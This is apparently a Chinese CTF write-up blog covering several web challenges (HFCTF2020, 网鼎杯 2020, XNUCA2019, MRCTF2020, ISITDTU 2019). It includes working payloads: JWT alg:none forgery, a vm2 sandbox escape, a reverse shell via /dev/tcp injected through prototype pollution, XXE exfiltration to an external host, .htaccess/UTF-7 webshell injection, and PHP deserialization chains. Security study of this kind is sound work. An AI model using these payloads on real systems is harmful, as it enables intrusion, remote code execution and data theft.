class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> APIError(<span class="string">'login error'</span>, <span class="string">'no such secret id'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>对于sid&gt;=0:js弱类型  </p><blockquote><p>[]&gt;=0   //true，数组<br>“”&gt;=0  //true，字符串</p></blockquote><p>对于sid &lt; global.secrets.length<br>注册以初始化全局变量secrets  </p><blockquote><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiYWRtaW4iLCJpYXQiOjE1ODg3NjI1NzN9.3IgFzoext6mvEihGuoEvscbdcRXtk9Abw1MolCaMeb4</p></blockquote><p>这样的形式代表的是base64(header).base64(payload).base64(signature)<br>当header中的alg为none时，后端将不执行签名验证<br>此时形式为:base64(header).base64(payload).  </p><p>/api/register在body传入json值注册用户，得到token回显<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">"token"</span>: <span class="string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzZWNyZXRpZCI6MiwidXNlcm5hbWUiOiJhYWEiLCJwYXNzd29yZCI6ImFhYSIsImlhdCI6MTU4ODgzODQyMX0.gqdlrjOgx2xBp-LA-0MVsw6LgGppnkp6tmmDiYQUDWw"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>去掉签名算法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"alg"</span>: <span class="string">"none"</span>,</span><br><span class="line">  <span class="string">"typ"</span>: <span class="string">"JWT"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">"secretid"</span>: [],</span><br><span class="line">  <span class="string">"username"</span>: <span class="string">"admin"</span>,</span><br><span class="line">  <span class="string">"password"</span>: <span class="string">"admin"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里用base64encode就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjogImFkbWluIiwicGFzc3dvcmQiOiAiYWRtaW4iLCJpYXQiOiAxNTg4ODM4NDIxfQ.</span><br></pre></td></tr></table></figure></p><p>在登录界面body传入username和password值,头中添加authorization传入token值<br>成功后访问/api/flag</p><h1 id="HFCTF2020-JustEscape"><a href="#HFCTF2020-JustEscape" class="headerlink" title="[HFCTF2020]JustEscape"></a>[HFCTF2020]JustEscape</h1><p><img src="02.png" alt=""><br>执行命令?注意编码?不是php?<br>看一下run.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"code"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'code'</span> ] != <span class="keyword">NULL</span> ) &#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">eval</span>(code);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>有个eval()<br>利用异常抛出的语句确认后端使用的语言<br>run.php?code=Error().stack</p><blockquote><p>js中捕获异常堆栈信息—Error.stack</p></blockquote><p>得到<br><img src="03.png" alt=""><br>=&gt;1.nodejs 2.vm2<br><a href="https://xz.aliyun.com/t/7184" target="_blank" rel="noopener">Node.js 常见漏洞学习与总结</a><br><a href="https://github.com/patriksimek/vm2/issues/225" target="_blank" rel="noopener">vm2-3.8.3逃逸issue</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/run.php?code=</span><br><span class="line">&apos;(&apos; + function()&#123;</span><br><span class="line">    TypeError.prototype.get_process = f=&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(&quot;&quot;)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e.get_process(()=&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;+&apos;)()&apos;;</span><br></pre></td></tr></table></figure></p><p>没什么反应,可能过滤了一些词<br><code>exec</code> <code>constructor</code> <code>process</code> <code>prototype</code> <code>&quot;&quot;</code> <code>+</code><br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings" target="_blank" rel="noopener">模板字符串</a><br>可以利用模板字符串嵌套来拼接，用反引号来代替双引号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">/run.php?code=</span><br><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[`$&#123;`$&#123;`prototyp`&#125;e`&#125;`][`$&#123;`$&#123;`get_proces`&#125;s`&#125;`] = f=&gt;f[`$&#123;`$&#123;`constructo`&#125;r`&#125;`](`$&#123;`$&#123;`return this.proces`&#125;s`&#125;`)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(``)).a = 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[`$&#123;`$&#123;`get_proces`&#125;s`&#125;`](()=&gt;&#123;&#125;).mainModule[`$&#123;`$&#123;`requir`&#125;e`&#125;`](`$&#123;`$&#123;`child_proces`&#125;s`&#125;`)[`$&#123;`$&#123;`exe`&#125;cSync`&#125;`](`cat ../flag`).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br><span class="line">``` </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># [网鼎杯 2020 青龙组]AreUSerialz</span><br><span class="line"> 中间因为补考鸽了好多天阿=。=，看一下错过的网鼎杯</span><br><span class="line">str传值后,要满足is_valid的条件(基本上都能满足)  </span><br><span class="line">最终目的是read()读取flag.php  </span><br><span class="line"></span><br><span class="line">类里有protected private public三种类型的参数  </span><br><span class="line">[一文让PHP反序列化从入门到进阶](https://xz.aliyun.com/t/6753#toc-2)  </span><br><span class="line">public参数不变，protected会变成 `%00*%00参数名`,private `%00类名%00参数名`  </span><br><span class="line">\_\_construct()会先执行  </span><br><span class="line">本地测试了以下，在类里魔术方法的执行优先级是大于其他方法的  </span><br><span class="line">如果说想要执行read,在read被调用之前就要使op==2，但是在这之前会首先执行__destruct，将op改为1  </span><br><span class="line">但是注意到这里__destruct()里的判断是`===`而write和read里的判断是`==`，可能是利用弱类型来绕过  </span><br><span class="line">[php弱类型安全](https://www.smi1e.top/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%AE%89%E5%85%A8/)</span><br><span class="line">可以利用2e0绕过  </span><br><span class="line"></span><br><span class="line">因为payload里会出现%00字符，所以需要绕过is_valid()里的判断  </span><br><span class="line">php版本是7.4.3，`php7.1+版本对属性类型不敏感`，就直接当成public即可</span><br></pre></td></tr></table></figure></p><p> &lt;?php<br>class FileHandler {<br>        public $op=2e0;<br>        public $filename=’flag.php’;<br>        public $content;<br>}<br>$a = new FileHandler();<br>echo serialize($a);<br>?&gt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;d:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</span><br></pre></td></tr></table></figure></p><h1 id="网鼎杯-2020-青龙组-notes"><a href="#网鼎杯-2020-青龙组-notes" class="headerlink" title="[网鼎杯 2020 青龙组]notes"></a>[网鼎杯 2020 青龙组]notes</h1><p>给了源码<br>用的express框架，是node.js<br>在status路由下有个exec()函数，先留意下<br>还有一个不咋见过的undefsafe()<br><a href="https://www.npmjs.com/package/undefsafe" target="_blank" rel="noopener">undefsafe()</a><br><a href="https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940" target="_blank" rel="noopener">Prototype Pollution in undefsafe | Snyk</a><br>文章给的poc:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">"undefsafe"</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">"__proto__.toString"</span>;</span><br><span class="line">a(&#123;&#125;,payload,<span class="string">"JHU"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(&#123;&#125;.toString);</span><br></pre></td></tr></table></figure></p><p>找到利用点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.author'</span>, author);</span><br><span class="line">    undefsafe(<span class="keyword">this</span>.note_list, id + <span class="string">'.raw_note'</span>, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在/edit_note里传入<br>id=<code>__proto__</code>，author=<code>bash -i &gt; /dev/tcp/ip/port 0&gt;&amp;1</code>，raw=<code>aaa</code><br>之后访问/status使得payload能实现<br><del>不过端口收不到任何东西是什么鬼阿</del><br>o,原来是要用它提供的服务器来连接的</p><h1 id="网鼎杯-2020-青龙组-filejava"><a href="#网鼎杯-2020-青龙组-filejava" class="headerlink" title="[网鼎杯 2020 青龙组]filejava"></a>[网鼎杯 2020 青龙组]filejava</h1><p><del>懵</del><br>传入文件后可以得到文件所在的路径<br>有任意文件上传的漏洞<br><a href="https://bealright.github.io/2019/10/24/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">任意文件下载漏洞</a>  </p><blockquote><p>/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则  </p></blockquote><p><code>POST /DownloadServlet?filename=../../../../WEB-INF/web.xml HTTP/1.1</code>读取servelet信息</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.DownloadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DownloadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/DownloadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.ListFileServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>ListFileServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/ListFileServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>cn.abc.servlet.UploadServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadServlet<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br><span class="line">``` </span><br><span class="line">`/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中`</span><br><span class="line"></span><br><span class="line">&gt; 对于`cn.abc.servlet.DownloadServlet`来说，相对地址是`WEB-INF/classes/cn/abc/servlet/DownloadServlet.class`</span><br><span class="line"></span><br><span class="line">下载.class文件进行反编译  </span><br><span class="line">在uploadservlet里有</span><br><span class="line">```java</span><br><span class="line">if (filename.startsWith("excel-") &amp;&amp; "xlsx".equals(fileExtName)) &#123;</span><br><span class="line">                        try &#123;</span><br><span class="line">                            final Workbook wb1 = WorkbookFactory.create(in);</span><br><span class="line">                            final Sheet sheet = wb1.getSheetAt(0);</span><br><span class="line">                            System.out.println(sheet.getFirstRowNum());</span><br><span class="line">                        &#125;</span><br><span class="line">                        catch (InvalidFormatException e) &#123;</span><br><span class="line">                            System.err.println("poi-ooxml-3.10 has something wrong");</span><br><span class="line">                            e.printStackTrace();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><p><a href="https://www.jishuwen.com/d/2inW/zh-hk" target="_blank" rel="noopener">利用 EXCEL 文件進行 XXE 攻擊的漏洞分析</a><br>当时是给了hint?buuoj上没有/flag的hint<br>新建一个excel-.xlsx文件后,改后缀为zip进行解压，修改[Content-Types].xml的内容<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % file SYSTEM "file:///flag"&gt;</span></span><br><span class="line"><span class="meta">    &lt;!ENTITY % remote SYSTEM 'http://ip:port/xxe.dtd'&gt;</span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;send;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>xxe.dtd：(放在根目录下)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &apos;http://ip:port/%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>修改内容后把文档压缩成xlsx文件，上传<br>之后查看apache的access.log<br><del>但是还是没有收到</del>  </p><h1 id="XNUCA2019Qualifier-EasyPHP"><a href="#XNUCA2019Qualifier-EasyPHP" class="headerlink" title="[XNUCA2019Qualifier]EasyPHP"></a>[XNUCA2019Qualifier]EasyPHP</h1><p>利用file_put_contents在文件中写入shell<br>$content过滤<code>on</code> <code>html</code> <code>type</code> <code>flag</code> <code>upload</code> <code>file</code><br>$filename使用[a-z.]</p><blockquote><p>由于题目服务器中间件为apache，因此想到了传.htaceess来解析php</p></blockquote><p>重写覆盖.htaccess文件</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><blockquote><p>include_path用来设置include()或require()函数包含文件的参考路径，当使用include()或require()函数包含文件的时候,程序首先以include_path设置的路径作为参考点去找文件,如果找不到,则以程序自身所在的路径为参考点去找所要的文件</p></blockquote><p>当文件中包含一个不存在的fl3g.php会报错</p><blockquote><p>error_log可以把错误日志保存到指定的目录中,log_errors为1开启错误记录</p></blockquote><p>报错时会把错误信息保存至某一文件中，利用php_value来设置这个文件  </p><blockquote><p>.htaccess中出现无意义字符再访问当前目录文件服务器将500</p></blockquote><p>上传的.htaccess要注释后边的<code>\njust one chance</code><br>apache的规则是注释要另起一行<br><code>\</code>有拼接上下两行的功能<br>.htaccess只支持单行注释，可以利用<code>#\</code>来注释掉后边的字符串  </p><blockquote><p>error_log的内容默认是htmlentities的</p></blockquote><p>可以使用utf-7编码绕过  </p><p>.htaccess:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value error_log /tmp/fl3g.php</span><br><span class="line">php_value error_reporting 32767</span><br><span class="line">php_value include_path &quot;+ADw?php eval($_GET[a])+ADs +AF8AXw-halt+AF8-compiler()+ADs&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure></p><p>访问index.php之后会留下错误记录再写入新的.htaccess<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php_value include_path &quot;/tmp&quot;</span><br><span class="line">php_value zend.multibyte 1</span><br><span class="line">php_value zend.script_encoding &quot;UTF-7&quot;</span><br><span class="line"># \</span><br></pre></td></tr></table></figure></p><blockquote><p>zend.multibyte 1 #进行编码<br>zend.script_encoding “UTF-7”  #指定utf-7编码</p></blockquote><p>再次访问index.php向a传入payload </p><h3 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h3><p>利用<code>\</code>拼接上下两行来绕过对file的检测<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure></p><p>auto_pretend_file的作用也是调用第三方文件<br>可以通过errordocument 404来自定义404界面，输出payload回显<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20&quot;.htaccess&quot;%0AErrorDocument%20404%20&quot;&lt;?php%20system(\&apos;cat%20../../../fl[a]g\&apos;);?&gt;\\</span><br></pre></td></tr></table></figure></p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() //使用unserialize时触发</span><br><span class="line">__sleep() //使用serialize时触发</span><br><span class="line">__destruct() //对象被销毁时触发</span><br><span class="line">__call() //在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //用于从不可访问（或不存在）的属性(protect private)读取数据</span><br><span class="line">__set() //用于将数据写入不可访问的属性</span><br><span class="line">__isset() //在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //把类当作字符串使用时触发</span><br><span class="line">__invoke() //当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure><p>Modifier():include()可以包含flag.php，需要将对象调用为函数时触发<strong>invoke()<br>Test():利用protected  $var调用</strong>get()返回一个函数<br>Show():echo一个类触发<strong>toString<br>我们的目的是得到include(flag.php)并通过</strong>toString打印出来  </p><p>给\$this-&gt;source传入new show(),触发<strong>toString(),此时因为Test()里没有\$source可以访问所以会触发</strong>get()<br>让\$p=new Modifier()触发__invoke()</p><p>exp:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span>  $var=<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source = <span class="keyword">new</span> Show();</span><br><span class="line">$a-&gt;source-&gt;str=<span class="keyword">new</span> Test();</span><br><span class="line">$a-&gt;source-&gt;str-&gt;p = <span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="ISITDTU-2019-EasyPHP"><a href="#ISITDTU-2019-EasyPHP" class="headerlink" title="[ISITDTU 2019]EasyPHP"></a>[ISITDTU 2019]EasyPHP</h1><p>这题咋这么眼熟….<br>给了源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($ascii = <span class="number">0</span>; $ascii &lt; <span class="number">256</span>; $ascii++) &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, chr($ascii))) &#123;</span><br><span class="line">        <span class="keyword">echo</span> chr($ascii);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打印没过滤的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">! # % ( ) * + - / : ; &lt; = &gt; ? @ A B C H I J K L M N Q R T U V W X Y Z \ ] ^ a b c h i j k l m n q r t u v w x y z &#125; ~</span><br></pre></td></tr></table></figure></p><p><a 